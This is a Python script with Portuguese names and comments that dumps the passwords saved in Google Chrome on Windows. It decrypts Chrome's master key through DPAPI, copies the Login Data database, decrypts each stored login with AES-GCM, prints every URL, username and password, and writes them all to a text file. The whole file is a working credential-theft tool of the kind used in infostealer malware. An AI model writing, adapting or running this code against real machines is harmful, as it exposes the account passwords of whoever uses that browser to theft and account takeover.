import json
import os
import base64
import sqlite3
import string
from getpass import getuser
from shutil import copy
from Cryptodome.Cipher import AES  # Use PyCryptodome
import win32crypt
import hashlib

def obter_chave_criptografia():
    """Recupera a chave AES usada para criptografar as senhas do Chrome"""
    caminho_local_state = os.path.join(
        os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State'
    )
    with open(caminho_local_state, 'r', encoding='utf-8') as file:
        local_state = json.loads(file.read())
    
    # Decodifica a chave em base64 e remove o cabeçalho DPAPI
    chave_criptografada = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
    
    # Descriptografa a chave usando DPAPI do Windows
    chave_descriptografada = win32crypt.CryptUnprotectData(chave_criptografada, None, None, None, 0)[1]
    return chave_descriptografada

def descriptografar_senha(senha_criptografada, chave):
    """Descriptografa uma senha criptografada com AES no Chrome"""
    try:
        # Senhas no Chrome v80+ são criptografadas usando AES no modo GCM
        vetor_inicializacao = senha_criptografada[3:15]
        senha_criptografada = senha_criptografada[15:-16]
        cifra = AES.new(chave, AES.MODE_GCM, vetor_inicializacao)
        senha_descriptografada = cifra.decrypt(senha_criptografada).decode('utf-8')
        return senha_descriptografada
    except Exception as e:
        print(f"Erro ao descriptografar a senha: {e}")
        return None

class Chrome:
    """ Extração de senhas do Chrome para Windows """
    def __init__(self):
        self.caminho_bd = os.path.join(
            os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\Login Data'
        )
        self.chave = obter_chave_criptografia()

    def obter_senhas(self):
        """Recupera as senhas salvas no Chrome"""
        # Copia o banco de dados de login para evitar problemas de bloqueio
        copy(self.caminho_bd, "Login Data.db")
        conn = sqlite3.connect("Login Data.db")
        cursor = conn.cursor()
        cursor.execute("""
            SELECT action_url, username_value, password_value 
            FROM logins
        """)
        senhas = []
        for linha in cursor.fetchall():
            url, nome_usuario, senha_criptografada = linha
            senha_descriptografada = descriptografar_senha(senha_criptografada, self.chave)
            if senha_descriptografada:
                senhas.append({
                    'url': url,
                    'nome_usuario': nome_usuario,
                    'senha': senha_descriptografada
                })
        conn.close()
        os.remove("Login Data.db")
        return senhas

    def salvar_senhas_arquivo(self, arquivo="chrome_senhas.txt"):
        """Salva as senhas extraídas em um arquivo de texto"""
        senhas = self.obter_senhas()
        with open(arquivo, 'w', encoding='utf-8') as file:
            for entrada in senhas:
                file.write(f"URL: {entrada['url']}\n")
                file.write(f"Nome de Usuário: {entrada['nome_usuario']}\n")
                file.write(f"Senha: {entrada['senha']}\n")
                file.write("="*40 + "\n")
        print(f"\nSenhas salvas no arquivo: {arquivo}")

    def exibir_senhas(self):
        """Exibe as senhas na tela"""
        senhas = self.obter_senhas()
        for entrada in senhas:
            print(f"URL: {entrada['url']}")
            print(f"Nome de Usuário: {entrada['nome_usuario']}")
            print(f"Senha: {entrada['senha']}")
            print("="*40)

def main():
    chrome = Chrome()
    chrome.exibir_senhas()  # Exibe as senhas na tela
    chrome.salvar_senhas_arquivo()  # Salva as senhas no arquivo "chrome_senhas.txt"

if __name__ == '__main__':
    main()

input("\n\nPRESSIONE ENTER PARA SAIR\n=========================\n\n")
